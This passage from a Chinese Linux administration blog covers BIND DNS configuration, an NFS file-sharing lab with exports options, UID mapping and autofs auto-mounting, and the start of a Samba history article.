172.25.0.$$GENERATE 1-200 $ PTR foundation$.ilt.example.com 从机数据文件的查看7版本上无法查看：因为从机在slaves目录下生成的配置文件是data类型的。6版本上可以查看：老版本是可以查看的。 配置文件详细解析主配置文件/etc/named.conf1234567891011121314151617181920212223242526272829303132333435Options 全局的配置行 options { //服务器的全局配置选项及一些默认设置        listen-on port 53 { any; }; //监听端口默认监听53号端口，也可写为 { 127.0.0.1; 192.168.139.46; }        listen-on-v6 port 53 { ::1; }; //对ip6支持        directory       &quot;/var/named&quot;;  //区域文件存储目录        dump-file       &quot;/var/named/data/cache_dump.db&quot;; //缓存的目录directory        statistics-file &quot;/var/named/data/named_stats.txt&quot;; // 状态信息文件        memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;; //内存信息文件        pid-file        &quot;/var/run/named/named.pid&quot;; //存着named的pid        forwarders     { 168.95.1.1; 139.175.10.20; }; // 如果域名服务器无法解析时，将请求交由168.95.1.1; 139.175.10.20来解析        allow-query    { any; };   //指定允许进行查询的主机，当然是要所有的电脑都可以查啦        allow-transfer { none; }; //指定允许接受区域传送请求的主机，说明白一点就是辅dns定义，比如辅dns的ip是192.168.139.5，那么可以这样定义{ 192.168.139.5; }，要不然主辅dns不能同步，当然，{}里的也可以用下面提到的acl。        // those options should be used carefully because they disable port        // randomization        // query-source    port 53;             // query-source-v6 port 53;Dnssec开头的是一些加密文件Xxxx.key是一些秘钥文件};logging { //指定服务器日志记录的内容和日志信息来源        channel default_debug {                file &quot;data/named.run&quot;;                severity dynamic;        };};zone &quot;.&quot; IN { //在这个文件中是用zone关键字来定义域区的，一个zone关键字定义一个域区 type hint; /*在这里type类型有三种，它们分别是master,slave和hint它们的含义分别是： master:表示定义的是主域名服务器 slave :表示定义的是辅助域名服务器 hint:表示是互联网中根域名服务器 */ Include &quot;/etc/named.rfc1912.conf&quot;Include &quot;/etc/named.root.key&quot; //两个include字段代表读取本配置文件时候同时读取/etc/named.rfc1912.conf和/etc/named.root.key文件，这里主要关注第一个文件，该文件是专门用于定义域的文件。} allow-query-cache主辅同步时: 6版本上必须加上 不然会报错 7版本不用 recursion主辅同步时 必须是yes，关掉之后会阻止新纪录进入到缓冲。 named.rfc1912.conf1234Zone &quot;域名 &quot;IN {File ;域对应的数据文件Allow-update ;是否需要更新} 注意 所有语句结束后都需要一个分号代表结束符 括号必须成对出现 file指向的数据文件写的是相对路径，相对于主配置文件的dirctory配置字段，即相对于/var/named目录。 主辅同步中slave需要的配置 12345Zone &quot;域名&quot; IN {Type slave;Masters { 172.25.0.11;} ;File &quot;slaves/test.com.zone&quot;;} 数据文件/var/named/named.localhost1234567891011121314151617181920TTL //代表周期，缓存时间，DNS会自己做缓存，1D就代表一天，缓存时间为一天。SOA //记录 --&gt;起始授权记录 @代表继承域名 IN SOA @ 用户名.域名 { 0;serial //序列号；一般写修改当天日期，从服务器根据该序列号来判定文件是否修改过。 1D；refresh // 多久做一次同步 1H；retry //重置时间，同步不成功时，间隔多久重新做一次同步 1W；expire //当重复同步不成功时，多久不再做同步。 3H；minimun //最小缓存时间，一般是错误缓存。假设有一个人，一直问我一个错误的域名，那我就会将该错误的域名缓存下来，当人再来问我时，我就不再搜寻，而将该结果反馈给他。这里将serial一列改为当前日期。}NS代表的是正向记录 ，解析还分成正向解析和反向解析，正向解析就是知道主机名，想要搜寻IP地址。这里先来看正向解析@代表继承域名 NS @ A 127.0.0.1 这句话代表，我的域名是localhost，localhost指向的是127.0.0.1如果不写@而写成域名，就应该写成test.com. Com后面必须有个点，代表根域的意思。 总结掌握实践项目","link":"/2016/12/23/booboo_easy_service/01_dns/"},{"title":"NFS文件共享服务","text":"NFS是什么NFS（Network File System）即网络文件系统，SUN公司开发的,是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。 NFS的原理假设我们有一个服务器，两个客户端。客户端可以将网络中的NFS服务器共享的目录挂载到本地端的文件系统中，而在本地端的系统中看来，那个远程主机的目录就好像自己的一个磁盘分区一样。 比如将配置好的NFS服务器上的/var/share/student1目录挂在到A客户端的/home/share/student1上面，那在客户端A上面进入/home/share/student1内，就可以看到NFS服务器系统中/var/share/student1目录下所有的内容了，并且可以执行cd，cp，mv，rm等命令。当然，权限要足够。这个/var/share/student1就好像NFS客户端的一个文件系统一样。所以，NFS也可以简单的看做是一个文件服务器（file system） 只要权限足够，客户端也可以对该目录下的内容进行读写操作等等。 NFS指的是一种服务 既然是服务，肯定会用到一些监听端口，那NFS用的是什么端口进行数据传输的？我也不知道，谁都不知道。基本上NFS这个服务的端口开在2049端口，但由于文件系统非常复杂，NFS支持的功能又相当的多，每一个功能就会启用一些端口来传输数据，所以，NFS需要调用额外的端口，那额外的端口号又是什么呢？额外的端口号并不固定。因为NFS默认传输的端口是随机取用未被使用的小于1024的端口用于传输。但如此一来，客户端连接服务器又成了问题，客户端并不知道我要链接那些端口。这时候就需要用到远程过程调用RPC服务了 remote procedure call。 RPC就是指定NFS各功能对应的端口号，然后通知给客户端，让客户端可以连接到正确的端口上。 对于服务端来说，在NFS启动的时候，会自动向RPC注册其各个功能所需要的随机端口号，让RPC了解NFS各项功能的端口号，PID，NFS所监听的IP等等。当客户端通过111端口号向server端RPC发出NFS访问请求时候，RPC就会找到对应已注册的端口号，并返还给客户端，客户端就可以通过这些端口号与NFS发起链接。比如说我是NFS，我在启动的时候，就会告诉RPC，我的A端口用于做什么事情，我的B端口用于做什么事情，RPC就会将其端口注册信息登记，等客户端发起请求的时候就可以直接找到RPC，而不是直接找我NFS，RPC可以直接告知客户端所需请求对应的正确的端口号。 当客户端执行操作文件系统的各项命令时候，会转交给客户端的RPC，客户端RPC负责接受各个程序与对应的端口后负责对主机进行解析。所以要使用NFS时，无论是客户端还是服务端，都需要启动RPC。 启动NFS之前，RPC就要先启动了，不然NFS无法向RPC注册，并且，RPC重启以后，原来注册的数据就没有了，所以RPC重新启动后，NFS也要重启，重新想RPC注册才行。 同样，A客户端对NFS服务器上的共享文件进行了修改后，B服务器能看到改后的文件，也就完成了各个主机之间文件的共享。所以如果重启了rpc，nfs也必须要重新启动，以便于重新像rpc注册相应的端口号。 NFS：处理客户端数据请求， RPC：处理客户端链接请求。 NFS的用处 存储共享方案 网络共享文件系统 项目实践1：配置NFS网络共享文件服务器要求rhel7 172.25.X.10 作为NFS网络共享文件服务器： 允许172.25.X.11这个客户端来挂接使用/tmp目录，有读写权限。 将读写权限改成只读权限；(ro) 允许172.25.X.0/24网段挂接/tmp目录，有读写权限； 服务器上创建uid=1200的用户tom，并使用tom用户创建/tmp/tomfile；在客户端创建uid=1200的用户jack，尝试去删除tomfile目录; 为什么不建议使用(rw,no_root_squash) 实验准备阶段 网络拓扑图 规划软件安装 修改配置文件 启动服务 客户端测试服务 网络拓扑图 规划软件安装 主机名 ip地址 软件 功能 rhel6 172.25.0.11 rpcbind nfs-utils 服务端 rhel7 172.25.0.10 rpcbind nfs-utils 客户端 123456789[root@rhel6 ~]# yum install -y nfs-utils rpcbindLoaded plugins: product-id, refresh-packagekit, security, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.server | 3.9 kB 00:00 server/primary_db | 3.1 MB 00:00 Setting up Install ProcessPackage 1:nfs-utils-1.2.3-39.el6.x86_64 already installed and latest versionPackage rpcbind-0.2.0-11.el6.x86_64 already installed and latest versionNothing to dorpcbind rpc:管理客户端和服务端的ip和端口号—连接 remote procedure call——远程过程调用协议 nfs-utils nfs:传输数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354[root@rhel6 ~]# rpm -qf /etc/exportssetup-2.8.14-20.el6_4.1.noarch[root@rhel6 ~]# rpm -ql rpcbind/etc/rc.d/init.d/rpcbind/sbin/rpcbind/usr/sbin/rpcinfo/usr/share/doc/rpcbind-0.2.0/usr/share/doc/rpcbind-0.2.0/AUTHORS/usr/share/doc/rpcbind-0.2.0/ChangeLog/usr/share/doc/rpcbind-0.2.0/README/usr/share/man/man8/rpcbind.8.gz/usr/share/man/man8/rpcinfo.8.gz/var/cache/rpcbind[root@rhel6 ~]# rpm -ql nfs-utils/etc/nfsmount.conf/etc/rc.d/init.d/nfs/etc/rc.d/init.d/nfslock/etc/rc.d/init.d/rpcgssd/etc/rc.d/init.d/rpcidmapd/etc/rc.d/init.d/rpcsvcgssd/etc/request-key.d/id_resolver.conf/etc/sysconfig/nfs/sbin/mount.nfs/sbin/mount.nfs4/sbin/nfs_cache_getent/sbin/rpc.statd/sbin/umount.nfs/sbin/umount.nfs4/usr/sbin/exportfs/usr/sbin/mountstats/usr/sbin/nfsidmap/usr/sbin/nfsiostat/usr/sbin/nfsstat/usr/sbin/rpc.gssd/usr/sbin/rpc.idmapd/usr/sbin/rpc.mountd/usr/sbin/rpc.nfsd/usr/sbin/rpc.svcgssd/usr/sbin/rpcdebug/usr/sbin/showmount/usr/sbin/sm-notify/usr/sbin/start-statd/usr/share/doc/n7/nfsd.7.gz... .../var/lib/nfs/var/lib/nfs/etab/var/lib/nfs/rmtab/var/lib/nfs/rpc_pipefs/var/lib/nfs/statd/var/lib/nfs/statd/sm/var/lib/nfs/statd/sm.bak/var/lib/nfs/state/var/lib/nfs/v4recovery/var/lib/nfs/xtab 修改配置文件 主配置文件 /etc/exports 服务名 rpcbind nfs 根据要求，允许172.25.X.10这个客户端来挂接使用/tmp目录，有读写权限。配置/etc/exports内容为/tmp 172.25.0.10(rw)后，根据服务名来打开相应的服务 123[root@rhel6 ~]# vim /etc/exports[root@rhel6 ~]# cat /etc/exports/tmp 172.25.0.10(rw) 启动服务 12345678910111213141516171819202122232425262728293031[root@rhel6 ~]# service rpcbind start[root@rhel6 ~]# service nfs startStarting NFS services: [ OK ]Starting NFS quotas: [ OK ]Starting NFS mountd: [ OK ]Starting NFS daemon: [ OK ]Starting RPC idmapd: [ OK ][root@rhel6 ~]# netstat -luntp |grep rpcbindtcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 1174/rpcbind tcp 0 0 :::111 :::* LISTEN 1174/rpcbind udp 0 0 0.0.0.0:111 0.0.0.0:* 1174/rpcbind udp 0 0 0.0.0.0:925 0.0.0.0:* 1174/rpcbind udp 0 0 :::111 :::* 1174/rpcbind udp 0 0 :::925 :::* 1174/rpcbind [root@rhel6 ~]# netstat -luntp |grep nfs[root@rhel6 ~]# ps -ef|grep nfsroot 1888 2 0 15:20 ? 00:00:00 [nfsd4]root 1889 2 0 15:20 ? 00:00:00 [nfsd4_callbacks]root 1890 2 0 15:20 ? 00:00:00 [nfsd]root 1891 2 0 15:20 ? 00:00:00 [nfsd]root 1892 2 0 15:20 ? 00:00:00 [nfsd]root 1893 2 0 15:20 ? 00:00:00 [nfsd]root 1894 2 0 15:20 ? 00:00:00 [nfsd]root 1895 2 0 15:20 ? 00:00:00 [nfsd]root 1896 2 0 15:20 ? 00:00:00 [nfsd]root 1897 2 0 15:20 ? 00:00:00 [nfsd]root 1928 1745 0 15:20 pts/0 00:00:00 grep nfs[root@rhel6 ~]# service iptables stopiptables: Setting chains to policy ACCEPT: filter [ OK ]iptables: Flushing firewall rules: [ OK ]iptables: Unloading modules: [ OK ] 守护进程daemon rpcbind nfsd 监听端口号 111 925 客户端测试使用 查看服务器共享目录的情况 showmount -e 172.25.0.11 远程挂载 mount 172.25.0.10:/tmp /mnt 123456789101112131415161718192021[root@rhel7 ~]# yum install -y nfs-utils rpcbindLoaded plugins: langpacks, product-id, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.Package 1:nfs-utils-1.3.0-0.el7.x86_64 already installed and latest versionPackage rpcbind-0.2.0-23.el7.x86_64 already installed and latest versionNothing to do[root@rhel7 ~]# showmount -e 172.25.0.11Export list for 172.25.0.11:/tmp 172.25.0.10[root@rhel7 ~]# mount 172.25.0.11:/tmp /mnt[root@rhel7 ~]# mount |tail -n 1172.25.0.11:/tmp on /mnt type nfs4 (rw,relatime,vers=4.0,rsize=131072,wsize=131072,namlen=255,hard,proto=tcp,port=0,timeo=600,retrans=2,sec=sys,clientaddr=172.25.0.10,local_lock=none,addr=172.25.0.11)[root@rhel7 mnt]# touch rhel7test[root@rhel7 mnt]# lltotal 12drwx------. 2 gdm gdm 4096 Sep 25 02:59 orbit-gdmdrwx------. 2 root root 4096 Jul 2 2015 pulse-oCBy0hGD1JT6drwx------. 2 gdm gdm 4096 Sep 25 02:59 pulse-q5sECpImz7Ju-rw-r--r--. 1 nfsnobody nfsnobody 0 Sep 25 2016 rhel7test[root@rhel7 mnt]# cd[root@rhel7 ~]# umount /mntnfsnobody 以 root 用户创建的文件被映射成 nfsnobody 用户 , 因为在服务器上没有指定 no_root_squash 将读写权限改成只读权限；(ro) 服务器端修改配置文件 1234567891011121314151617[root@rhel6 ~]# vim /etc/exports[root@rhel6 ~]# cat /etc/exports/tmp 172.25.0.10(ro)[root@rhel6 ~]# service rpcbind restartStopping rpcbind: [ OK ]Starting rpcbind: [ OK ][root@rhel6 ~]# service nfs restartShutting down NFS daemon: [ OK ]Shutting down NFS mountd: [ OK ]Shutting down NFS quotas: [ OK ]Shutting down NFS services: [ OK ]Shutting down RPC idmapd: [ OK ]Starting NFS services: [ OK ]Starting NFS quotas: [ OK ]Starting NFS mountd: [ OK ]Starting NFS daemon: [ OK ]Starting RPC idmapd: [ OK ] 客户端rhel7 1234[root@rhel7 ~]# mount 172.25.0.11:/tmp /mnt[root@rhel7 ~]# touch /mnt/rhel7test2touch: cannot touch ‘/mnt/rhel7test2’: Read-only file system[root@rhel7 ~]# umount /mnt 允许172.25.X.0/24网段挂接/tmp目录，有读写权限； 修改配置文件为 /tmp 172.25.0.0/24(rw) 1234567891011121314151617[root@rhel6 ~]# vim /etc/exports[root@rhel6 ~]# cat /etc/exports/tmp 172.25.0.0/24(rw)[root@rhel6 ~]# service rpcbind restartStopping rpcbind: [ OK ]Starting rpcbind: [ OK ][root@rhel6 ~]# service nfs restartShutting down NFS daemon: [ OK ]Shutting down NFS mountd: [ OK ]Shutting down NFS quotas: [ OK ]Shutting down NFS services: [ OK ]Shutting down RPC idmapd: [ OK ]Starting NFS services: [ OK ]Starting NFS quotas: [ OK ]Starting NFS mountd: [ OK ]Starting NFS daemon: [ OK ]Starting RPC idmapd: [ OK ] 分别在客户端和服务器上都创建一个id=1200的用户tom，在客户端用tom用户新建一个文件rhel7tomfile，并查看属性，再到服务器上去查看该文件的属性；在服务器上用tom用户去创建rhel6tomfile，查看属性，再到客户端上查看属性。 1234567891011121314151617181920212223242526272829303132333435# 服务端rhel6[root@rhel6 ~]# useradd -u 1200 tom[root@rhel6 ~]# echo uplooking|passwd --stdin tomChanging password for user tom.passwd: all authentication tokens updated successfully.[root@rhel6 ~]# su - tom[tom@rhel6 ~]$ touch /tmp/tomfile[tom@rhel6 ~]$ ll /tmp/tomfile-rw-rw-r--. 1 tom tom 0 Sep 25 15:55 /tmp/tomfile[tom@rhel6 tmp]$ touch rhel6tomfile# 客户端rhel7[tom@rhel7 mnt]$ touch rhel7tomfile[tom@rhel7 mnt]$ lltotal 12-rw-rw-r--. 1 nobody nobody 0 Sep 25 04:03 4913drwx------. 2 gdm gdm 4096 Sep 25 02:59 orbit-gdmdrwx------. 2 root root 4096 Jul 2 2015 pulse-oCBy0hGD1JT6drwx------. 2 gdm gdm 4096 Sep 25 02:59 pulse-q5sECpImz7Ju-rw-rw-r--. 1 nobody nobody 0 Sep 25 04:07 rhel7tomfile-rw-rw-r--. 1 nobody nobody 0 Sep 25 04:06 tomfile[tom@rhel7 mnt]$ rm -rf rhel7tomfilerm: cannot remove ‘rhel7tomfile’: Operation not permitted[tom@rhel7 mnt]$ rm -rf rhel6tomfilerm: cannot remove ‘rhel6tomfile’: Operation not permitted# 服务端rhel6[tom@rhel6 tmp]$ lltotal 12-rw-rw-r--. 1 tom tom 0 Sep 25 16:03 4913drwx------. 2 gdm gdm 4096 Sep 25 14:59 orbit-gdmdrwx------. 2 root root 4096 Jul 2 2015 pulse-oCBy0hGD1JT6drwx------. 2 gdm gdm 4096 Sep 25 14:59 pulse-q5sECpImz7Ju-rw-rw-r--. 1 tom tom 0 Sep 25 16:10 rhel6tomfile-rw-rw-r--. 1 tom tom 0 Sep 25 16:07 rhel7tomfile 两个新文件在客户端均显示属于nobody，而在服务器端显示属于tom用户，并且会发现在客户端由tom用户创建出来的文件也没有办法删除。 这是由于当前服务器版本比客户端低的缘故。 如果将rhel7作为服务端，rhel6作为客户端，就不会出现上述问题了。如下所示： 主机名 ip地址 软件 功能 rhel6 172.25.0.11 rpcbind nfs-utils 客户端 rhel7 172.25.0.10 rpcbind nfs-utils 服务端 1234567891011121314151617181920212223242526272829303132333435# 服务端rhel7[root@rhel7 ~]# vim /etc/exports[root@rhel7 ~]# systemctl stop firewalld[root@rhel7 ~]# systemctl start rpcbind[root@rhel7 ~]# systemctl start nfs# 客户端rhel6[root@rhel6 tmp]# mount 172.25.0.10:/tmp /mnt[root@rhel6 tmp]# cd /mnt[tom@rhel6 mnt]$ touch rhel6tomfile[tom@rhel6 mnt]$ lltotal 0-rw-rw-r--. 1 tom tom 0 Sep 25 16:22 rhel6tomfiledrwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQdrwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN# 服务端rhel7[tom@rhel7 tmp]$ touch rhel7tomfile[tom@rhel7 tmp]$ lltotal 0-rw-rw-r--. 1 tom tom 0 Sep 25 04:22 rhel6tomfile-rw-rw-r--. 1 tom tom 0 Sep 25 04:24 rhel7tomfiledrwx------. 3 root root 16 Sep 25 02:59 systemd-private-hPL7GQdrwx------. 3 root root 16 Sep 25 02:58 systemd-private-jFcaMN# 客户端rhel6[tom@rhel6 mnt]$ lltotal 0-rw-rw-r--. 1 tom tom 0 Sep 25 16:22 rhel6tomfile-rw-rw-r--. 1 tom tom 0 Sep 25 16:24 rhel7tomfiledrwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQdrwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN[tom@rhel6 mnt]$ rm -rf rhel6tomfile[tom@rhel6 mnt]$ rm -rf rhel7tomfile[tom@rhel6 mnt]$ lltotal 0drwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQdrwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN 文件所属者和所属组是根据uid和gid来匹配的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 服务器rhel7[root@rhel7 ~]# useradd -u 1003 batman[root@rhel7 ~]# echo uplooking|passwd --stdin batmanChanging password for user batman.passwd: all authentication tokens updated successfully.[root@rhel7 ~]# id batmanuid=1003(batman) gid=1003(batman) groups=1003(batman)[root@rhel7 ~]# su batman[batman@rhel7 root]$ cd /tmp[batman@rhel7 tmp]$ lltotal 0drwx------. 3 root root 16 Sep 25 02:59 systemd-private-hPL7GQdrwx------. 3 root root 16 Sep 25 02:58 systemd-private-jFcaMN[batman@rhel7 tmp]$ touch rhel7batmanfile[batman@rhel7 tmp]$ lltotal 0-rw-rw-r--. 1 batman batman 0 Sep 25 04:27 rhel7batmanfiledrwx------. 3 root root 16 Sep 25 02:59 systemd-private-hPL7GQdrwx------. 3 root root 16 Sep 25 02:58 systemd-private-jFcaMN[root@rhel6 mnt]# lltotal 0-rw-rw-r--. 1 1003 1003 0 Sep 25 16:27 rhel7batmanfiledrwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQdrwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN[root@rhel6 mnt]# useradd -u 1003 superman[root@rhel6 mnt]# echo uplooking|passwd --stdin supermanChanging password for user superman.passwd: all authentication tokens updated successfully.[root@rhel6 mnt]# lltotal 0-rw-rw-r--. 1 superman superman 0 Sep 25 16:27 rhel7batmanfiledrwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQdrwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN[root@rhel6 mnt]# su superman[superman@rhel6 mnt]$ lltotal 0-rw-rw-r--. 1 superman superman 0 Sep 25 16:27 rhel7batmanfiledrwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQdrwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN[superman@rhel6 mnt]$ rm -rf rhel7batmanfile[superman@rhel6 mnt]$ lltotal 0drwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQdrwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN 在服务器上以 batman 用户创建的文件被映射成客户端的 superman 用户 , 因为在服务器上 batman 的 id 与 superman 的 id 相同 为什么不建议使用(rw,no_root_squash) 面试题 客户说为什么我是root，却不能删除root的文件呢（前提是该文件是nfs服务挂接使用的）？ 1）考虑到安全，当前我们nfs的配置中就设置为本地的root用户是没有权限删除服务器端的root用户文件的。 2）如果客户你一定要去有这个权限，那么你可以修改配置，添加一个no_root_squash；不建议这么做。 客户电话咨询说服务器出故障了， 1）挂接目录执行任何操作就卡死了，然后我重启，就卡在哪里了，/mnt 2）前一天还正常，今天上班开不了机了 3）mount查看当前挂接目录，卡在哪里，杀掉进程，再mount还是卡在那里 以上都有可能是nfs服务器连接出现问题了，应该去检查一下nfs服务器的运行情况。再排错。 配置文件详解主配置文件/etc/exports关于exports的写法，我们可以通过 man 5 exports 来查看 EXAMPLES 12345678910# sample /etc/exports file# 共享目录 客户端列表（权限） / master(rw) trusty(rw,no_root_squash) /projects proj*.local.domain(rw) /usr *.local.domain(ro) @trusted(rw) /home/joe pc001(rw,all_squash,anonuid=150,anongid=100) /pub *(ro,insecure,all_squash) /srv/www -sync,rw server @trusted @external(ro) /foo 2001:db8:9:e54::/64(rw) 192.0.2.0/24(rw) /build buildhost[0-9].local.domain(rw) 详细参数解释如下表所示： 参数 说明 rw 可读可写 ro 只读 sync 数据同步写入内存缓冲区与磁盘中，虽然这样做效率较低，但可以保证数据的一致性（适合于小文件传输） async 数据先暂时放于内存，而非直接写入硬盘，等到必要时才写入磁盘（适合于大文件传输） no_root_squash 使用nfs时，如果用户是root，不进行权限压缩，即root用户在nfs上创建的文件 属组和属主仍然是root（不安全，不建议使用） root_squash 使用nfs时，如果用户是root，则进行权限压缩，即把root用户在nfs上创建的文件 属组和属主修改为nfsnobody all_squash 所有的普通用户使用nfs都将使用权限压缩，即：将远程访问的所有普通用户及所属用户组都映射为匿名用户或者用户组（一般均为nfsnobody） no_all_squash 所有的普通用户使用nfs都不使用权限压缩，即：不将远程访问的所有普通用户及所属用户组都映射为匿名用户或者用户组（默认设置） anonuid=XXX anon即anonymous(匿名者)，前面关于*_squash提到的匿名用户的uid的设置值，通常为nobody或者nfsnobody，使用这个参数可以自行设定这个uid值，这个uid必须存在 于/etc/passwd anongid=XXX 将远程访问的所有用户组都映身为匿名用户组账户，并指定该匿名用户组账户为本地用户组账户（GID=XXX） insecure 允许客户端从大于1024的TCP/IP端口连NFS服务器 secure 限制客户端只能从小于1024的TCP/IP端口连接NFS服务器(默认设置) wdelay 检查是否有相关的写操作，如果有则将这些写操作一起执行，这样可提高效率(默认设置) no_wdelay 若有写操作则立即执行（应与sync配置） subtree_check 若输出目录是一个子目录，则NFSW:务器将检查其父目录的权限(默认设置) no_subtree_check 即使输出目录是一个子目录，NFS服务器也不检查其父目录的权限，这样做可提高效率 设置实例 /tmp *(rw,no_root_squash) 在所有的IP（主机）上登录的用户都可对NFS服务器上的共享目录/tmp拥有rw操作权限，同时如果是root用户访问该共享目录，那么不将root用户及所属用户组都映射为匿名用户或用户组（*表示所有的主机或者IP） /tmp *(rw) 在所有的IP（主机）登录的用户都可对NFS服务器上的共享目录/tmp拥有rw操作权限 /home/public 192.168.0.*(rw) *(ro) 或者 /home/public 192.168.0.0/24(rw) *(ro) 除了在192. 168. 0.0/24这个网段内的主机上登录的用户，可对NFS服务器共享目录/home/public进行rw操作权限，而其它网段的主机上登录的用户，对NFS服务器共享目录/home/public只能进行r操作 /home/test 192.168.0.100(rw) 只对192.168.0.100该台主机设置权限，即：使在该台主机登录的用户都可对NFS服务器上的共享目录/home/test拥有读与写的操作 /home/linux *.linux.org(rw,all_squash,anonuid=40,anongid=40) 当*.linux.org（加入域linux.org的所有主机） 登陆此NFS主机，并且在/home/linux下面写入档案时，该档案的所有人与所有组，就会变成NFS服务器上的/etc/passwd文件里面对应的UID为40的那个身份的使用者了（因为指定了参数：all_squash，anonuid=40，anongid=40） 项目实践2：自动挂接NFS要求分别通过下面三种方法实现自动挂接 * /etc/fstab（容易出问题） * /etc/bashrc * autofs服务 /etc/fstab12345[root@rhel6 ~]# vim /etc/fstab172.25.0.10:/tmp /mnt nfs defaults 0 0[root@rhel6 ~]# mount -a[root@rhel6 ~]# mount |tail -n 1172.25.0.10:/tmp on /mnt type nfs (rw,vers=4,addr=172.25.0.10,clientaddr=172.25.0.11) 如果nfs服务器出现问题，导致客户端无法挂接，此时就会出现开机启动失败的情况。因此不建议这么做。 /etc/bashrc12345678910111213141516[root@rhel6 ~]# vim /etc/bashrc[root@rhel6 ~]# grep mount /etc/bashrcmount 172.25.0.10:/tmp /mnt[root@rhel6 ~]# rebootBroadcast message from root@rhel6 (/dev/pts/0) at 16:53 ...The system is going down for reboot NOW![root@rhel6 ~]# Connection to 172.25.0.11 closed by remote host.Connection to 172.25.0.11 closed.[root@foundation0 ~]# ssh root@172.25.0.11Last login: Sun Sep 25 16:52:03 2016 from 172.25.0.250mount.nfs: Connection timed out 如果将挂接的命令放在开机启动后的终端启动脚本中，那么只会有一个报错而已。 autofs 自动挂接服务使用的时候挂接，不使用等待5分钟后卸载，而等待的时间时可以调整的，在/etc/sysconfig/autofs配置文件中通过TIMEOUT参数调整，例如TIMEOUT=300。 软件 autofs service autofs daemon automount 配置文件 /etc/auto.master 父挂接点 /etc/auto.booboo 子挂接点123172.25.0.10:/tmp /mnt/share /mnt 父挂接点 share 子挂接点 配置文件格式 可以通过man 5 autofs查看配置文件的格式 12345/etc/auto.master/mnt /etc/auto.booboo/etc/auto.boobooshare -rw 172.25.0.10:/tmp 自动挂接autofs场景 rhel7 作为nfs网络共享文件系统服务；rhel6作为nfs的客户端现在想自动挂接rhel7的/tmp目录使用，可以通过autofs。 主机名 ip地址 软件 功能 rhel6 172.25.0.11 rpcbind nfs-utils nfs客户端；autofs服务端 rhel7 172.25.0.10 rpcbind nfs-utils nfs服务端 1234567891011121314151617181920212223242526272829[root@rhel6 ~]# yum install -y autofsLoaded plugins: product-id, refresh-packagekit, security, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.Setting up Install ProcessPackage 1:autofs-5.0.5-88.el6.x86_64 already installed and latest versionNothing to do[root@rhel6 ~]# rpm -ql autofs/etc/auto.master/etc/auto.misc/etc/auto.net/etc/auto.smb/etc/autofs_ldap_auth.conf/etc/rc.d/init.d/autofs/etc/sysconfig/autofs/misc/net[root@rhel6 ~]# vim /etc/auto.master/mnt /etc/auto.booboo[root@rhel6 ~]# vim /etc/auto.boobooshare -rw 172.25.0.10:/tmp[root@rhel6 ~]# mkdir /mnt/share[root@rhel6 ~]# service autofs startStarting automount: [ OK ][root@rhel6 ~]# ll /mnt/sharetotal 0drwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQdrwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN 总结","link":"/2016/12/23/booboo_easy_service/03_nfs/"},{"title":"SAMBA文件共享服务","text":"Samba的历史及原理在早期的网络世界中，文件数据在不同主机之间的传输大多是使用FTP这个好用的服务器软件进行的。不过，使用FTP传输文件却有个小小的问题，那就是您无法直接修改主机上面的文件数据。也就是说，您想要更改Linux主机上面的某个文件时，必须要由服务器端将该文件下载到您工作的客户端后才能修改，因此该文件在服务器端和客户端都会存在。这时，如果有一天您修改了某个文件，却忘记将数据上传回主机，那么等过了一阵子之后，您如何知道哪既然有这样的问题，那好吧，我可不可以在客户端的机器上面直接取用服务器上面的文件？如果可以在客户端直接进行服务器端文件的访问，那么我在客户端就不需要存在该文件数据了，也就是说，我只要有服务器上面的文件数据存在就可以了。有没有这样的文件系统（File System）呢？前面我们提到过的Network File System（NFS）就是这样的文件系统之一。只要在客户端将服务器端所提供的共享目录挂载进来，那么在我的客户端就可以直接取用服务器上的文件数据，而且，该数据就像是客户端上的分区一样，非常好用！而除了可以让Unix Like的机器互相分享文件的NFS服务器之外，在微软（Microsoft）上面也有类似的文件系统，那就是Common Internet File System（CIFS）。CIFS最简单的用途就是目前常见的“网上邻居”。Windows系统的计算机可以通过桌面上的“网上邻居”来访问别人所提供的文件数据。不过，NFS仅能让Unix机器沟通，CIFS只能让Windows机器沟通。那么有没有让Windows与Unix Like这两个不同的平台相互分享文件数据的文件系统呢？个文件才是最新的？ 在1991年，一个名叫Andrew Tridgwell的大学生就有这样的困扰，他手上有三台机器，分别是运行DOS的个人计算机、DEC公司的Digital Unix系统以及Sun的Unix系统。在当时，DEC 公司开发出一套称为PATHWORKS的软件，这套软件可以用来分享DEC的Unix与个人计算机的DOS这两个操作系统的文件数据，可惜让Tridgwell觉得较困扰的是Sun的Unix无法通过这个软件来达到文件共享的目的。这个时候Tridgwell就想：“咦！既然这两台系统可以共享，没道理Sun就必须这么苦命吧？可不可以将这两个系统的工作原理找出来，然后让Sun机器也能够共享文件数据呢？”，为了解决这样的的问题，Tridgwell就自行编写了一个程序去检测当DOS与DEC的Unix系统在进行文件分享传输时所使用到的通信协议信息，然后获取这些重要的信息，并且基于上述所找到的通信协议而开发出Server Message Block（SMB）这个文件系统，而就是这套SMB软件就能够让Unix与DOS互相共享文件。 